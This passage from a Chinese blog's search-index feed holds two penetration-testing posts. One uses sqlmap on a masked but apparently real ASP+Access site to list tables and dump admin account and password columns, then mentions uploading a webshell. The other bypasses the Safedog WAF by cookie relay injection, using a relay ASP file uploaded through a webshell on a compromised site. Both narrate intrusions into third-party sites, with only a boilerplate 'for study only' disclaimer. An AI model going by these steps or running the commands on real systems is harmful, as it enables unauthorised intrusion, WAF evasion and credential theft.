src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306185837138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实判断有注入的方法有很多，并不局限于and 1=1这个参数。<br>只需要在ID后面输入任意的字符，只要网站页面报错，则说明有注入。<br>这是为什么？因为只要网站报错，就说明我们任意输入的字符被带入到数据库查询了，因此我们可以插入恶意的SQL语句，注入攻击就这样产生了<br>现在已经成功的验证了这个网站的确存在注入，下一步我们将进行注入攻击</p><p><strong>步骤2：使用sqlmap进行注入攻击</strong></p><p>我使用的是Kali里面自带的sqlmap<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306190335991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">sqlmap -u “<a href="http://www.XXXX.com/news_view.asp?id=47”" target="_blank" rel="noopener">http://www.XXXX.com/news_view.asp?id=47”</a> 判断注入的类型，以及使用的数据库，网站的脚本类型，操作系统<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306191005506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们可以看到，网站使用的是Access数据库，脚本类型是ASP，操作系统是Windows<br>Access数据库比较单一，注入起来省时省力，他的结构图大体是这样的<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306191257847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来使用sqlmap -u “<a href="http://www.XXXX.com/news_view.asp?id=47”" target="_blank" rel="noopener">http://www.XXXX.com/news_view.asp?id=47”</a> –tables来列表名<br>这里我们填10个线程，加快爆破速度<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306193634847.png?x-oss-process=image/watermark,t%E8%BF%99%E9%87%8Cype_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆出了一个manage表，这就省时又省力了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306201304624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着我们使用sqlmap -u “<a href="http://www.XXXX.com/news_view.asp?id=47”" target="_blank" rel="noopener">http://www.XXXX.com/news_view.asp?id=47”</a> –columns -T manage来爆列名<br>这里爆出来了6个列，初步判断CMS的账号密码存放在 account，password这两个列里<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019030620134943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后我们用sqlmap -u “<a href="http://www.XXXX.com/news_view.asp?id=47”" target="_blank" rel="noopener">http://www.XXXX.com/news_view.asp?id=47”</a> –dump -C “account,password” -T manage爆字段内容<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306201425833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到账号：admin密码：999999（这其实也是弱口令，找到后台的第一时间可以碰碰运气试一下）接下来就可以登陆后台传小马，放大马，拿Shell了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190306200216487.png" alt="在这里插入图片描述"><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Sqlmap </tag>
            
            <tag> Access </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解新手如何绕过安全狗对网站进行Cookie中转注入攻击</title>
      <link href="/posts/8110977f.html"/>
      <url>/posts/8110977f.html</url>
      
        <content type="html"><![CDATA[<p>随着网络安全逐渐被大家所重视，现在存在注入漏洞的网站越来越少（此处指asp+access或mssql），大多数网站使用了通用防注入程序，有的网站虽然没有直接使用通用防注入，但是其关键代码也是相差无几。<br>         那么我们是不是就不能对这样的网站进行注入了呢？不！其实针对很多网站我们都可以使用cookie中转进行注入，刚好今天渗透了一个可以进行Cookie中转注入的网站，于是就把渗透心得分享给大家，小白操作，大牛勿喷    …<br>         首先我在参数后加上单引号判断是否可以注入，页面返回不正常，于是我加上AnD 1=1进行进一步的判断，结果有只狗拦住了我<br>         <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314005036279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    本人平生最痛恨这条狗，正面刚肯定是不行的了，就想办法找别的突破点，随后发现这个网站可以进行中转注入，如何进行中转注入，大致分为以下几个步骤：</p><p><strong>步骤1：判断是否可以进行中转注入</strong><br>我个人判断是否可以进行中转注入的方式有两种<br>①：用BurpSuite抓包，看一下http respond中的Cookie是否包含参数，这里发现包含参数传递，原理上只要在参数后加上单引号看一下页面的返回情况就可以判断是否可以进行中转注入，可是这里不好判断到底那个是参数，于是我们用第二种方法，但作者在这里还是推荐大家使用第一种，学着看一下http respond，这样判断会更准确，也更直白<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019031402001345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>②：删除?后的参数，如果页面返回不正常，说明可能存在中转注入，很明显这里返回不正常<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314011837278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>步骤二：使用注入中转生成器生成可中转注入页面</strong><br>这时候我们拿出一款古老的武器，是由 寂寞的刺猬 写的一款中转注入软件，虽然是07年的软件，但放到现在依然非常好用，佩服！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314012237372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们选中cookie注入以后就要开始填写左面的选项了，首先我们把要进行注入的链接粘贴进“注入URL地址”和“来源页”中。<br>然后把URL中的参数名称填入上面的“注入键名”。<br>“post提交值”中将00改为URL中参数的值。<br>最后把URL中的“？”以及后面的参数部分去掉。<br>填写好后如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314012546165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>注意：工具里“正常的Cookie值”不需要修改！</strong><br>然后点击“生成asp”就可以在程序的根目录下生成一个用来中转的asp文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314020515129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们需要把这个asp文件上传到一个支持asp的网络空间中去，这里我用一个webshell将这个asp文件传了上去，我们访问这个刚刚上传上去的asp文件。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314013407589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在我们可以看到，我访问的这个地址虽然是肉鸡网站的地址，但是我们看到的却是刚才检测注入的页面。<br>大家现在可能已经发现了，这样没有参数的链接是无法进行注入的。那么我们现在把刚才在中转生成器中填写的“post提交值”一栏中的内容添加到现在的URL的后面（不要忘了中间的“？”），那么现在的URL就变成了：<a href="http://www.XXXX.com.tw/admin/news_photo/62/jmCook.asp?jmdcw=16509" target="_blank" rel="noopener">http://www.XXXX.com.tw/admin/news_photo/62/jmCook.asp?jmdcw=16509</a><br>我们访问这个地址，发现了什么？是不是可以进行注入了？<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314014018455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>步骤三：使用sqlmap对中转页面进行注入攻击</strong><br>这里就不多啰嗦了，把URL放sqlmap里跑一下看看结果就知道了，使用sqlmap对asp+access数据库进行注入攻击在前面的文章有详细的讲解，欢迎大家一起交流讨论哦(<a href="https://blog.csdn.net/qq_43573676/article/details/88253529" target="_blank" rel="noopener">https://blog.csdn.net/qq_43573676/article/details/88253529</a>)<br>现在我们就利用Cookie中转成功的绕过了那只狗，可以进行下一步的操作了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190314015314401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> Cookie中转注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
